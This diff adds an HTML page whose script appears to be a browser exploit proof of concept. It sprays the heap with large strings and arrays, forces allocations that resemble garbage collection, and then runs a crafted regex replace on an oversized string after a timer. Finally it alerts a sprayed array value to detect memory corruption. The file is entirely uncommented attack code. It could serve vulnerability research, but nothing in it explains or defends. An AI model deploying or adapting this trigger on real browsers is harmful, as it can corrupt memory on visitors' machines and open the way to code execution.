@@ -1,0 +1,68 @@
+<script>
+alert("start");
+var array=new Array(0x4000);
+function neuter(ab) {
+    postMessage("", "*", [ab]);
+}
+function gc() {
+    try {
+        var c = document.createElement("canvas");
+        var gl = c.getContext("2d");
+
+        for (var i = 0; i < 0x1DA; i++) {
+            var ggg = gl.createImageData(1, 0x200)
+        }
+    } catch (e) {
+
+    }
+}
+function createStringWithRepeatedChar(c, multiplicity) {
+    while (c.length < multiplicity)
+        c += c;
+    return c;
+}
+var x = "1";
+var y="";
+var tmp="";
+var storage=new Array(0x10000/8);
+for(var i=0;i<storage.length;i++){
+storage[i]=0xAAAA;
+}
+var mystr1=createStringWithRepeatedChar("M",(1<<16));
+var mystr2=createStringWithRepeatedChar("N",(1<<16));
+
+for(var i=0;i<0x50;i++){
+tmp+="\uFFFF";
+}
+var tmpy = createStringWithRepeatedChar("\u0000",(1 << 16) );
+x = createStringWithRepeatedChar(x, 1 << 16);
+x+="1";
+y=tmp+tmpy.substring(0,0x10000-0x50);
+x.substring(0,5);
+mystr1.substring(0,5);
+storage.length=0x10000/4;
+for(var i=0;i<storage.length;i++){
+storage[i]=0xAAAA;
+}
+y.substring(0,5);
+mystr1=0;
+/* for(var i=0;i<array.length;i++){
+array[i] =createStringWithRepeatedChar("M", 1 << 12);
+array[i].substr(0,5);
+
+}
+for(var i=0;i<array.length;i++){
+if(i%2){
+array[i]=0;
+}
+}*/
+function myfunc(){
+//alert("to trigger");
+gc();
+eval("x.replace(/\\d/g, y)");
+alert("ok");
+alert(storage[0].toString(16));
+alert("end");
+}
+setTimeout(myfunc,6000);
+</script>
